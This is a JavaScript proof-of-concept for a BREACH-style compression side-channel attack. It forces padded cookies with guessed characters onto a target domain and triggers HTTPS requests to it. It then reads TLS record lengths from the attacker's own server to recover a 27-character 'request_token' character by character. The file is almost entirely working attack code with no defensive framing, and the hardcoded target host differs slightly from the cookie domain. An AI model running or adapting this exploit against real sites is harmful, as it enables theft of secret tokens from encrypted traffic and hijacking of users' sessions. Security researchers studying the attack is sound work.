//bb63e4ba67e24dab81ed425c5a95b7a2
var baseURL = "https://cookebreach.com/poc.php";
var canary = "request_token='";
var paddingCount = 40;
var paddingBlock = '{}';
var endingBlock = '@';
var knownToken = '';
var tokenLength = 27;
var guessCharIndex = 0;
var guessRound = 0;
var reflectedCookieName = 'nickname';
var reflectedCookiePath = '/';
var reflectedCookieDomain = '.cookiebreach.com';
var tlsLengthVector = [];
var tokenAlphabet = [];

function printKnownToken() {
    $('.knowntoken').text(knownToken);
    var knownCount = knownToken.length;
    $('.progress').width((knownCount * 100 / tokenLength) + '%');
}

function printWinner(winner) {
    $('.winner').text(winner);
}

function printFinished(knownToken) {
    $('.knownToken').text(knownToken + ' (Finished)');
}

function printLog(msg) {
    console.debug(msg);
    var msgNode = $('<div>');
    msgNode.text(msg);
    var logNode = $('.log');
    logNode.append(msgNode);
    logNode.scrollTop(logNode.prop("scrollHeight"));
}

function guessError() {
    guessCharIndex = 0;
    paddingCount += Math.floor(Math.random()*9+1); 
    var padding = buildPadding(paddingCount);
    printLog('Expand padding to: ' + paddingCount);
}

function checkGuessRound() {
    printLog('Guess: ' + tokenAlphabet[guessCharIndex] + ' - ' + tlsLengthVector);
    if(tlsLengthVector[0] == tlsLengthVector[1]) {
        return false;
    } else if(tlsLengthVector[0] + 1 == tlsLengthVector[1]) {
        return true;
    } else if(tlsLengthVector[0] + 1 < tlsLengthVector[1]) {
        console.log('error');
        return false;
    }
    return false;
}

function httpsTriggered() {
    var finished = false;
    var lastLength = getLastTlsLength();
    tlsLengthVector[guessRound] = lastLength;
    if(guessRound == 0) {
        guessRound++;
    } else {
        guessRound = 0;
        if(checkGuessRound() == true) {
            var winner = tokenAlphabet[guessCharIndex];
            knownToken += winner;
            guessCharIndex = 0;
            printWinner(winner);
            printKnownToken();
            if(knownToken.length == tokenLength) {
                finished = true;
                printFinished(knownToken);
            }
        } else {
            guessCharIndex++;
            if(guessCharIndex >= tokenAlphabet.length) {
                guessError();
            }
        }
        tlsLengthVector = [];
    }
    if(finished != true) {
        triggerHttps();
    }
}

function buildPadding(count) {
    var padding = '';
    for(var i = 0; i < count; i++) {
        padding += paddingBlock;
    }
    return padding;
}
function forceCookie(data) {
    document.cookie = reflectedCookieName + "=" + data + "; path=" + reflectedCookiePath + "; domain=" + reflectedCookieDomain + "; SECURE;";
}
function triggerHttps() {
    var img = new Image();
    img.onerror = httpsTriggered;
    var padding = buildPadding(paddingCount);
    var guessChar = tokenAlphabet[guessCharIndex];
    if(guessRound == 0) {
        forceCookie(canary + knownToken + guessChar + padding + endingBlock);
    } else {
        forceCookie(canary + knownToken + padding + guessChar + endingBlock);
    }
    img.src = baseURL;
}
function getLastTlsLength() {
    var lastLegnth = 0;
    $.ajax({
        url: '/?type=lastlength',
        async: false
    }).done(function(data) {
        data = $.parseJSON(data);
        lastLegnth = data.lastLength;
    });
    return lastLegnth;
}
function initTokenAlphabet() {
    for(var chr = '0'; chr <= '9';) {
        tokenAlphabet.push(chr);
        chr = String.fromCharCode(chr.charCodeAt(0) + 1);
    }
    
    for(var chr = 'a'; chr <= 'z';) {
        tokenAlphabet.push(chr);
        chr = String.fromCharCode(chr.charCodeAt(0) + 1);
    }
}
function startBreach() {
    initTokenAlphabet();
    guessRound = 0;
    guessCharIndex = 0;
    triggerHttps();
}

$(startBreach);
